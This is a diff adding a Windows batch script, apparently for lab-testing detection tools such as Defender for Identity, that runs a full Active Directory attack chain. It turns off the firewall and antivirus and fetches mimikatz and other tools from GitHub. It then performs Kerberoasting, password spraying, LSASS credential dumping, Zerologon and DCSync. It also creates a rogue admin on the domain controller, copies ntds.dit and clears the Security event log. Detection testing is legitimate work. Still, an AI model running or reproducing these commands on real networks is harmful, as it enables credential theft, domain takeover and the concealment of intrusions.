@@ -1,0 +1,123 @@
+@echo on
+echo DO NOT RUN THIS ON A MICROSOFT MACHINE. THIS IS MEANT TO BE RUN IN A LAB/TEST ENVIRONMENT ONLY!!!!
+echo You are about to perform a series of attack techniques. Press Y to Continue, N to Exit.
+choice /c YN
+rem if %errorlevel%==2 goto no
+
+mkdir c:\temp
+cd c:\temp
+
+rem **Turn off firewall and antivirus
+netsh advfirewall set allprofiles state off
+powershell.exe -Command "Add-MpPreference -ExclusionPath 'c:\temp'"
+powershell.exe -Command "Set-ExecutionPolicy unrestricted"
+powershell.exe -Command "Set-MpPreference -DisableBlockAtFirstSeen $true -DisableBehaviorMonitoring $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -SubmitSamplesConsent NeverSend -PUAProtection Disabled -MAPSReporting Disabled"
+
+rem **Download scripts
+bitsadmin /transfer stage2 /download /priority normal https://github.com/anfisher1967/SecTools/raw/main/mdi.zip c:\temp\mdi.zip
+TIMEOUT /T 3
+tar -xf mdi.zip
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/threatspeak/lab/blob/main/mimikatz.b64?raw=true' -OutFile .\mimikatz.txt" 
+TIMEOUT /T 3
+powershell.exe .\DisableNotifications.ps1
+
+rem **Network-mapping reconnaissance (DNS) (PUT YOUR DOMAIN CONTROLLER AND DOMAIN NAME HERE)
+(Echo server DC1.corp.contoso.com & Echo ls -d corp.contoso.com)|NSLOOKUP
+
+rem **User and IP Address reconnaissance (PUT YOUR DC NAME HERE)
+NetSess.exe DC1.corp.contoso.com
+
+rem **Directory Service Enumeration
+net user /domain 
+net group /domain 
+net group "Domain Admins" /domain 
+net group "Enterprise Admins" /domain 
+net group "Schema Admins" /domain 
+
+rem **Security principal reconnaissance (LDAP)
+oradad.exe
+TIMEOUT /T 3
+
+rem **Enumerate accounts with Kerberos DES enabled
+powershell.exe "([adsisearcher]'(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=2097152))').FindAll() | Out-File -FilePath .\accounts.txt"
+
+rem **Enumerate accounts with Kerberos Pre-Authentication disabled
+powershell.exe "([adsisearcher]'(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))').FindAll() | Out-File -FilePath .\accounts.txt -Append"
+
+rem **Enumerate all enabled accounts
+powershell.exe "([adsisearcher]'(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))').FindAll() | Out-File -FilePath .\accounts.txt -Append"
+
+rem **Enumerate all servers configured for Unconstrained Delegation (Excluding DCs)
+powershell.exe "([adsisearcher]'(&(objectCategory=computer)(!(primaryGroupID=516))(userAccountControl:1.2.840.113556.1.4.803:=524288))').FindAll() | Out-File -FilePath .\accounts.txt -Append"
+
+powershell.exe "Get-Content -Path .\accounts.txt"
+
+rem **Account enumerations Reconnaissance. (PUT YOUR DOMAIN HERE)
+powershell.exe -Command " & {Import-Module .\adlogin.ps1; adlogin users.txt corp.contoso.com P@ssw0rd!}"
+TIMEOUT /T 3
+
+rem **Suspected AS-REP Roasting attack (PUT YOUR DOMAIN CONTROLLER HERE)
+Rubeus.exe kerberoast
+TIMEOUT /T 3
+Rubeus.exe kerberoast /tgtdeleg  
+TIMEOUT /T 3
+Rubeus.exe asktgs /service:http/DC1.corp.contoso.com /ptt
+TIMEOUT /T 3
+
+rem **Suspected Brute-Force Attack (Kerberos, NTLM and LDAP) & Password Spray attack (PUT YOUR DOMAIN HERE)
+wmic useraccount get name >domainusers.txt
+TIMEOUT /T 3
+powershell.exe -Command " & { Import-Module .\adlogin.ps1; adlogin domainusers.txt corp.contoso.com P@ssw0rd!}"
+TIMEOUT /T 3
+
+rem **Dump Credentials In-Memory
+certutil.exe -decode mimikatz.txt mimikatz.exe
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >victimcpc.txt
+TIMEOUT /T 3
+
+rem **Malicious request of Data Protection API (DPAPI) master key (PUT YOUR DC HERE)
+mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:DC1.corp.contoso.com /export"  "exit"
+TIMEOUT /T 3
+
+rem **Suspected Netlogon privilege elevation attempt (PUT YOUR DC AND DOMAIN HERE)
+mimikatz.exe "privilege::debug" "lsadump::zerologon /target:DC1.corp.contoso.com /account:admin$"  "exit"
+TIMEOUT /T 3
+
+rem **Suspected DCSync attack (replication of directory services) (PUT YOUR DOMAIN HERE)
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.contoso.com /user:krbtgt" "exit"
+TIMEOUT /T 3
+
+rem **Domain dominance (PUT YOUR DOMAIN CONTROLLER HERE)
+wmic /node:DC1.corp.contoso.com process call create "net user /add BadGuy pa$$w0rd1"
+PsExec.exe \\DC1.corp.contoso.com -accepteula net localgroup "Administrators" BadGuy /add
+TIMEOUT /T 3
+
+rem **Dump Secrets (PUT YOUR DOMAIN CONTROLLER HERE)
+PsExec.exe -accepteula -s -d \\dc1.corp.contoso.com reg save HKLM\security\policy\secrets %temp%\secrets
+
+rem **Remote code execution attempts (PUT YOUR DOMAIN CONTROLLER HERE)
+PSExec.exe -accepteula -s -d \\dc1.corp.contoso.com cmd.exe
+
+rem **Data exfiltration over SMB (PUT YOUR DOMAIN CONTROLLER HERE)
+PSExec.exe -accepteula -s -d \\dc1.corp.contoso.com cmd /c esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit
+
+rem ** Cleanup ** (PUT YOUR DOMAIN CONTROLLER HERE)
+wmic /node:"DC1.corp.contoso.com" process call create "net user /delete BadGuy"
+del *.zip
+del *.txt
+del *.csv
+del *.log
+del *.xml
+del *.b64
+del *.ps1
+del *.mla
+del *.pvk
+del *.der
+del *.pfx
+del *.key
+del *.bat
+del *.exe
+powershell.exe -Command "Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" -Name ToastEnabled -Value 1 -Force"
+powershell.exe -Command "Clear-EventLog -LogName Security"
+powershell.exe -Command "Set-MpPreference -DisableBlockAtFirstSeen $false -DisableBehaviorMonitoring $false -DisableRealtimeMonitoring $false -DisableScriptScanning $false -EnableControlledFolderAccess Enabled -EnableNetworkProtection AuditMode -Force -SubmitSamplesConsent SendAllSamples -MAPSReporting Advanced -PUAProtection Enabled"
+netsh advfirewall set allprofiles state on
